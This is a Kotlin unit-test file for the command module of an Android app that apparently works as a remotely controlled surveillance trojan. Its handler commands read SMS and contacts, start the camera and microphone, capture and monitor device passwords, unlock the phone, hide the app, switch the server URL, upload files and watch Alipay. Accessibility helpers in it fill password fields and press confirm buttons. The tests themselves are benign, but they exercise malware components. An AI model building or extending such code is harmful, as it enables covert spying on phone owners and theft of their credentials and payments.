package com.storm.safe.rock.service.modules.command

import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.test.runTest
import org.json.JSONObject
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

/**
 * Tests for Batch B: command module.
 * Covers CommandHandler interface, CommandDispatcher, CommandContext, and all 8 command handlers.
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [30])
@OptIn(ExperimentalCoroutinesApi::class)
class CommandModuleTest {

    private lateinit var commandContext: CommandContext
    private lateinit var dispatcher: CommandDispatcher

    @Before
    fun setUp() {
        commandContext = CommandContext(service = null, networkManager = null)
        dispatcher = CommandDispatcher(commandContext)
    }

    // =============================================
    // CommandHandler interface tests
    // =============================================

    @Test
    fun `CommandHandler canHandle uses getSupportedCommands by default`() {
        val handler = object : CommandHandler {
            override fun getSupportedCommands() = setOf("TEST_CMD")
            override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {}
        }
        assertTrue(handler.canHandle("TEST_CMD"))
        assertFalse(handler.canHandle("OTHER_CMD"))
    }

    // =============================================
    // CommandDispatcher tests
    // =============================================

    @Test
    fun `CommandDispatcher initially has no handlers`() {
        assertEquals(0, dispatcher.getHandlerCount())
        assertEquals(0, dispatcher.getCacheSize())
    }

    @Test
    fun `CommandDispatcher registerHandler increases count`() {
        val handler = AdbTunnelCommandHandler()
        dispatcher.registerHandler(handler)
        assertEquals(1, dispatcher.getHandlerCount())
    }

    @Test
    fun `CommandDispatcher unregisterHandler decreases count`() {
        val handler = AdbTunnelCommandHandler()
        dispatcher.registerHandler(handler)
        dispatcher.unregisterHandler(handler)
        assertEquals(0, dispatcher.getHandlerCount())
    }

    @Test
    fun `CommandDispatcher dispatch returns false for empty command`() = runTest {
        val json = JSONObject().apply { put("command", "") }
        assertFalse(dispatcher.dispatch(json))
    }

    @Test
    fun `CommandDispatcher dispatch returns false when no handler found`() = runTest {
        val json = JSONObject().apply { put("command", "NONEXISTENT") }
        assertFalse(dispatcher.dispatch(json))
    }

    @Test
    fun `CommandDispatcher dispatch routes to correct handler`() = runTest {
        var handled = false
        val handler = object : CommandHandler {
            override fun getSupportedCommands() = setOf("MY_COMMAND")
            override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
                handled = true
            }
        }
        dispatcher.registerHandler(handler)

        val json = JSONObject().apply { put("command", "MY_COMMAND") }
        assertTrue(dispatcher.dispatch(json))
        assertTrue(handled)
    }

    @Test
    fun `CommandDispatcher caches handler on first dispatch`() = runTest {
        val handler = object : CommandHandler {
            override fun getSupportedCommands() = setOf("CACHED_CMD")
            override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {}
        }
        dispatcher.registerHandler(handler)

        assertEquals(0, dispatcher.getCacheSize())
        dispatcher.dispatch(JSONObject().apply { put("command", "CACHED_CMD") })
        assertEquals(1, dispatcher.getCacheSize())

        // Second dispatch should use cache
        dispatcher.dispatch(JSONObject().apply { put("command", "CACHED_CMD") })
        assertEquals(1, dispatcher.getCacheSize())
    }

    @Test
    fun `CommandDispatcher dispatch passes params correctly`() = runTest {
        var receivedParams: JSONObject? = null
        val handler = object : CommandHandler {
            override fun getSupportedCommands() = setOf("PARAM_CMD")
            override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
                receivedParams = params
            }
        }
        dispatcher.registerHandler(handler)

        val json = JSONObject().apply {
            put("command", "PARAM_CMD")
            put("params", JSONObject().apply {
                put("key", "value")
            })
        }
        dispatcher.dispatch(json)
        assertNotNull(receivedParams)
        assertEquals("value", receivedParams?.optString("key"))
    }

    @Test
    fun `CommandDispatcher dispatch catches handler exceptions`() = runTest {
        val handler = object : CommandHandler {
            override fun getSupportedCommands() = setOf("FAIL_CMD")
            override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
                throw RuntimeException("Test exception")
            }
        }
        dispatcher.registerHandler(handler)

        val json = JSONObject().apply { put("command", "FAIL_CMD") }
        assertFalse(dispatcher.dispatch(json))
    }

    @Test
    fun `CommandDispatcher clear removes all handlers and cache`() = runTest {
        dispatcher.registerHandler(AdbTunnelCommandHandler())
        dispatcher.registerHandler(DeviceStateCommandHandler())
        dispatcher.dispatch(JSONObject().apply { put("command", "DEVICE_PING") })

        dispatcher.clear()
        assertEquals(0, dispatcher.getHandlerCount())
        assertEquals(0, dispatcher.getCacheSize())
    }

    @Test
    fun `CommandDispatcher dispatches to first matching handler`() = runTest {
        var firstHandled = false
        var secondHandled = false

        val handler1 = object : CommandHandler {
            override fun getSupportedCommands() = setOf("SHARED_CMD")
            override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
                firstHandled = true
            }
        }
        val handler2 = object : CommandHandler {
            override fun getSupportedCommands() = setOf("SHARED_CMD")
            override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
                secondHandled = true
            }
        }
        dispatcher.registerHandler(handler1)
        dispatcher.registerHandler(handler2)

        dispatcher.dispatch(JSONObject().apply { put("command", "SHARED_CMD") })
        assertTrue(firstHandled)
        assertFalse(secondHandled)
    }

    // =============================================
    // CommandContext tests
    // =============================================

    @Test
    fun `CommandContext sendEvent does not throw when networkManager is null`() {
        val ctx = CommandContext(service = null, networkManager = null)
        ctx.sendEvent("test", JSONObject())
        // Should not throw
    }

    @Test
    fun `CommandContext emitLocalEvent does not throw`() {
        val ctx = CommandContext(service = null, networkManager = null)
        ctx.emitLocalEvent("test", mapOf("key" to "value"))
        // Should not throw
    }

    @Test
    fun `CommandContext reportLocalServiceUnavailable does not throw`() {
        val ctx = CommandContext(service = null, networkManager = null)
        ctx.reportLocalServiceUnavailable("req-123")
        // Should not throw
    }

    // =============================================
    // AdbTunnelCommandHandler tests
    // =============================================

    @Test
    fun `AdbTunnelCommandHandler supports 7 commands`() {
        val handler = AdbTunnelCommandHandler()
        assertEquals(7, handler.getSupportedCommands().size)
        assertTrue(handler.canHandle("DEPLOY_LOCAL_SERVICE"))
        assertTrue(handler.canHandle("FULL_DEPLOY"))
        assertTrue(handler.canHandle("DIRECT_PAIR"))
        assertFalse(handler.canHandle("SMS_READ"))
    }

    @Test
    fun `AdbTunnelCommandHandler handle OPEN_ABOUT_PHONE does not throw`() = runTest {
        val handler = AdbTunnelCommandHandler()
        handler.handle("OPEN_ABOUT_PHONE", null, commandContext)
    }

    @Test
    fun `AdbTunnelCommandHandler sendDeployStatus creates correct JSON`() {
        // Should not throw
        AdbTunnelCommandHandler.sendDeployStatus(commandContext, "started", "test message")
    }

    @Test
    fun `AdbTunnelCommandHandler sendCommandResult creates correct JSON`() {
        AdbTunnelCommandHandler.sendCommandResult(commandContext, true, "success")
    }

    // =============================================
    // DeviceStateCommandHandler tests
    // =============================================

    @Test
    fun `DeviceStateCommandHandler supports 4 commands`() {
        val handler = DeviceStateCommandHandler()
        assertEquals(4, handler.getSupportedCommands().size)
        assertTrue(handler.canHandle("GET_DEVICE_STATE"))
        assertTrue(handler.canHandle("DEVICE_PING"))
    }

    @Test
    fun `DeviceStateCommandHandler handle GET_DEVICE_STATE does not throw`() = runTest {
        val handler = DeviceStateCommandHandler()
        handler.handle("GET_DEVICE_STATE", null, commandContext)
    }

    @Test
    fun `DeviceStateCommandHandler DEVICE_PING dedup logic`() = runTest {
        val handler = DeviceStateCommandHandler()
        DeviceStateCommandHandler.pingTimestamps.clear()

        val params = JSONObject().apply {
            put("timestamp", System.currentTimeMillis())
            put("viewerId", "viewer1")
        }

        // First ping should be accepted
        handler.handle("DEVICE_PING", params, commandContext)
        assertTrue(DeviceStateCommandHandler.pingTimestamps.containsKey("viewer1"))

        // Rapid second ping should be deduped (within 300ms)
        val beforeSize = DeviceStateCommandHandler.pingTimestamps.size
        handler.handle("DEVICE_PING", params, commandContext)
        assertEquals(beforeSize, DeviceStateCommandHandler.pingTimestamps.size)
    }

    @Test
    fun `DeviceStateCommandHandler CLEAR_PASSWORD does not throw`() = runTest {
        val handler = DeviceStateCommandHandler()
        val params = JSONObject().apply { put("passwordType", "lock") }
        handler.handle("CLEAR_PASSWORD", params, commandContext)
    }

    // =============================================
    // LogCommandHandler tests
    // =============================================

    @Test
    fun `LogCommandHandler supports 8 commands`() {
        val handler = LogCommandHandler()
        assertEquals(8, handler.getSupportedCommands().size)
        assertTrue(handler.canHandle("GET_LOG_LIST"))
        assertTrue(handler.canHandle("SET_LOG_OPTIONS"))
    }

    @Test
    fun `LogCommandHandler processCommand GET_LOG_LIST returns success`() {
        val handler = LogCommandHandler()
        val result = handler.processCommand("GET_LOG_LIST", JSONObject().apply {
            put("type", "KSTR")
        })
        assertTrue(result.optBoolean("success"))
        assertEquals("KSTR", result.optString("type"))
    }

    @Test
    fun `LogCommandHandler processCommand READ_LOG requires filename`() {
        val handler = LogCommandHandler()
        val result = handler.processCommand("READ_LOG", JSONObject().apply {
            put("type", "KSTR")
            // no filename
        })
        assertFalse(result.optBoolean("success"))
        assertEquals("filename is required", result.optString("error"))
    }

    @Test
    fun `LogCommandHandler processCommand READ_LOG with filename returns success`() {
        val handler = LogCommandHandler()
        val result = handler.processCommand("READ_LOG", JSONObject().apply {
            put("type", "KSTR")
            put("filename", "test_log")
        })
        assertTrue(result.optBoolean("success"))
    }

    @Test
    fun `LogCommandHandler processCommand DELETE_LOG requires filename`() {
        val handler = LogCommandHandler()
        val result = handler.processCommand("DELETE_LOG", JSONObject().apply {
            put("type", "KSTR")
        })
        assertFalse(result.optBoolean("success"))
    }

    @Test
    fun `LogCommandHandler processCommand unknown command`() {
        val handler = LogCommandHandler()
        val result = handler.processCommand("UNKNOWN", null)
        assertFalse(result.optBoolean("success"))
        assertTrue(result.optString("error").contains("Unknown command"))
    }

    @Test
    fun `LogCommandHandler processCommand GET_LOG_OPTIONS returns options`() {
        val handler = LogCommandHandler()
        val result = handler.processCommand("GET_LOG_OPTIONS", null)
        assertTrue(result.optBoolean("success"))
        assertTrue(result.has("options"))
    }

    @Test
    fun `LogCommandHandler processCommand CLEAR_ALL_LOGS returns success`() {
        val handler = LogCommandHandler()
        val result = handler.processCommand("CLEAR_ALL_LOGS", null)
        assertTrue(result.optBoolean("success"))
    }

    // =============================================
    // FileCommandHandler tests
    // =============================================

    @Test
    fun `FileCommandHandler supports 12 commands`() {
        val handler = FileCommandHandler()
        assertEquals(12, handler.getSupportedCommands().size)
        assertTrue(handler.canHandle("FILE_LIST"))
        assertTrue(handler.canHandle("FILE_DOWNLOAD_HTTP"))
        assertTrue(handler.canHandle("FILE_UPLOAD"))
    }

    @Test
    fun `FileCommandHandler handle FILE_LIST does not throw`() = runTest {
        val handler = FileCommandHandler()
        handler.handle("FILE_LIST", JSONObject().apply {
            put("path", "/sdcard")
            put("requestId", "req1")
        }, commandContext)
    }

    // =============================================
    // AppCommandHandler tests
    // =============================================

    @Test
    fun `AppCommandHandler supports 23 commands`() {
        val handler = AppCommandHandler()
        assertEquals(23, handler.getSupportedCommands().size)
        assertTrue(handler.canHandle("GET_APP_LIST"))
        assertTrue(handler.canHandle("MUTE"))
        assertTrue(handler.canHandle("mute"))
        assertTrue(handler.canHandle("SET_BRIGHTNESS"))
        assertTrue(handler.canHandle("set_brightness"))
    }

    @Test
    fun `AppCommandHandler handle VOLUME_UP does not throw`() = runTest {
        val handler = AppCommandHandler()
        handler.handle("VOLUME_UP", null, commandContext)
    }

    @Test
    fun `AppCommandHandler handle CHANGE_SERVER_URL with empty url logs warning`() = runTest {
        val handler = AppCommandHandler()
        handler.handle("CHANGE_SERVER_URL", JSONObject(), commandContext)
    }

    @Test
    fun `AppCommandHandler handle SEND_NOTIFICATION with missing params logs warning`() = runTest {
        val handler = AppCommandHandler()
        handler.handle("SEND_NOTIFICATION", JSONObject(), commandContext)
    }

    // =============================================
    // SmsContactsCommandHandler tests
    // =============================================

    @Test
    fun `SmsContactsCommandHandler supports 8 commands`() {
        val handler = SmsContactsCommandHandler()
        assertEquals(8, handler.getSupportedCommands().size)
        assertTrue(handler.canHandle("SMS_READ"))
        assertTrue(handler.canHandle("CONTACTS_READ"))
        assertTrue(handler.canHandle("GET_CONTACTS"))
    }

    @Test
    fun `SmsContactsCommandHandler handle SMS_READ does not throw`() = runTest {
        val handler = SmsContactsCommandHandler()
        handler.handle("SMS_READ", JSONObject().apply { put("limit", 50) }, commandContext)
    }

    // =============================================
    // DetectionCommandHandler tests
    // =============================================

    @Test
    fun `DetectionCommandHandler supports 14 commands`() {
        val handler = DetectionCommandHandler()
        assertEquals(14, handler.getSupportedCommands().size)
        assertTrue(handler.canHandle("ALIPAY_DETECTION_START"))
        assertTrue(handler.canHandle("SET_VIEW_CACHE_RULES"))
        assertTrue(handler.canHandle("LOCAL_SERVICE_PROXY"))
    }

    @Test
    fun `DetectionCommandHandler handle ALIPAY_DETECTION_START does not throw`() = runTest {
        val handler = DetectionCommandHandler()
        handler.handle("ALIPAY_DETECTION_START", JSONObject().apply {
            put("delayMs", 1000)
        }, commandContext)
    }

    @Test
    fun `DetectionCommandHandler handle SET_SENSITIVE_APPS with null apps logs warning`() = runTest {
        val handler = DetectionCommandHandler()
        handler.handle("SET_SENSITIVE_APPS", JSONObject(), commandContext)
    }

    @Test
    fun `DetectionCommandHandler handle LOCAL_SERVICE_PROXY with empty path emits error`() = runTest {
        val handler = DetectionCommandHandler()
        handler.handle("LOCAL_SERVICE_PROXY", JSONObject().apply {
            put("path", "")
        }, commandContext)
    }

    // =============================================
    // MediaCommandHandler tests
    // =============================================

    @Test
    fun `MediaCommandHandler supports 9 commands`() {
        val handler = MediaCommandHandler()
        assertEquals(9, handler.getSupportedCommands().size)
        assertTrue(handler.canHandle("CAMERA_START"))
        assertTrue(handler.canHandle("CAMERA_SWITCH"))
        assertTrue(handler.canHandle("ALBUM_READ_THUMBNAILS"))
    }

    @Test
    fun `MediaCommandHandler handle CAMERA_START without permission`() = runTest {
        val handler = MediaCommandHandler()
        handler.handle("CAMERA_START", null, commandContext)
    }

    @Test
    fun `MediaCommandHandler handle MICROPHONE_SET_CONFIG applies settings`() = runTest {
        val handler = MediaCommandHandler()
        handler.handle("MICROPHONE_SET_CONFIG", JSONObject().apply {
            put("qualityMode", "HIGH")
            put("audioSource", "VOICE_RECOGNITION")
            put("volumeGain", 1.5)
            put("noiseSuppression", false)
        }, commandContext)
    }

    @Test
    fun `MediaCommandHandler CAMERA_SWITCH throttles rapid requests`() = runTest {
        val handler = MediaCommandHandler()

        // First call should proceed
        handler.handle("CAMERA_SWITCH", JSONObject(), commandContext)

        // Immediate second call should be throttled (within 1500ms)
        handler.handle("CAMERA_SWITCH", JSONObject(), commandContext)
        // No assertion needed — just verifying no crash
    }

    // =============================================
    // UnlockCommandHandler tests
    // =============================================

    @Test
    fun `UnlockCommandHandler supports 10 commands`() {
        val handler = UnlockCommandHandler()
        assertEquals(10, handler.getSupportedCommands().size)
        assertTrue(handler.canHandle("POWER_WAKE"))
        assertTrue(handler.canHandle("POWER_SLEEP"))
        assertTrue(handler.canHandle("SMART_UNLOCK_SWIPE"))
        assertTrue(handler.canHandle("UNLOCK_DEVICE"))
    }

    @Test
    fun `UnlockCommandHandler handle POWER_SLEEP does not throw`() = runTest {
        val handler = UnlockCommandHandler()
        handler.handle("POWER_SLEEP", null, commandContext)
    }

    @Test
    fun `UnlockCommandHandler handle POWER_WAKE does not throw`() = runTest {
        val handler = UnlockCommandHandler()
        handler.handle("POWER_WAKE", null, commandContext)
    }

    @Test
    fun `UnlockCommandHandler handle GET_DEVICE_PASSWORD extracts type`() = runTest {
        val handler = UnlockCommandHandler()
        handler.handle("GET_DEVICE_PASSWORD", JSONObject().apply {
            put("passwordType", "PIN_4")
        }, commandContext)
    }

    @Test
    fun `UnlockCommandHandler handle ENABLE_PASSWORD_MONITORING does not throw`() = runTest {
        val handler = UnlockCommandHandler()
        handler.handle("ENABLE_PASSWORD_MONITORING", null, commandContext)
    }

    @Test
    fun `UnlockCommandHandler sendUnlockResult does not throw`() {
        UnlockCommandHandler.sendUnlockResult(commandContext, true, "解锁成功")
    }

    @Test
    fun `UnlockCommandHandler clickConfirmButton with null service does not throw`() {
        UnlockCommandHandler.clickConfirmButton(null)
    }

    @Test
    fun `UnlockCommandHandler fillPasswordField with null service returns false`() {
        assertFalse(UnlockCommandHandler.fillPasswordField(null, "1234"))
    }

    @Test
    fun `UnlockCommandHandler findEditableNodes finds editable children`() {
        val root = AccessibilityNodeInfo.obtain()
        val result = mutableListOf<AccessibilityNodeInfo>()
        // AccessibilityNodeInfo in Robolectric has no children by default
        UnlockCommandHandler.findEditableNodes(root, result)
        // Root is not editable by default
        assertEquals(0, result.size)
    }

    // =============================================
    // Full dispatcher integration test
    // =============================================

    @Test
    fun `full dispatcher with all handlers routes commands correctly`() = runTest {
        dispatcher.registerHandler(AdbTunnelCommandHandler())
        dispatcher.registerHandler(DeviceStateCommandHandler())
        dispatcher.registerHandler(LogCommandHandler())
        dispatcher.registerHandler(FileCommandHandler())
        dispatcher.registerHandler(AppCommandHandler())
        dispatcher.registerHandler(SmsContactsCommandHandler())
        dispatcher.registerHandler(DetectionCommandHandler())
        dispatcher.registerHandler(MediaCommandHandler())
        dispatcher.registerHandler(UnlockCommandHandler())

        assertEquals(9, dispatcher.getHandlerCount())

        // Test routing
        assertTrue(dispatcher.dispatch(JSONObject().apply { put("command", "DEVICE_PING") }))
        assertTrue(dispatcher.dispatch(JSONObject().apply { put("command", "POWER_WAKE") }))
        assertTrue(dispatcher.dispatch(JSONObject().apply { put("command", "CAMERA_STOP") }))
        assertTrue(dispatcher.dispatch(JSONObject().apply { put("command", "HIDE_APP") }))

        // Unknown command
        assertFalse(dispatcher.dispatch(JSONObject().apply { put("command", "TOTALLY_UNKNOWN") }))
    }
}
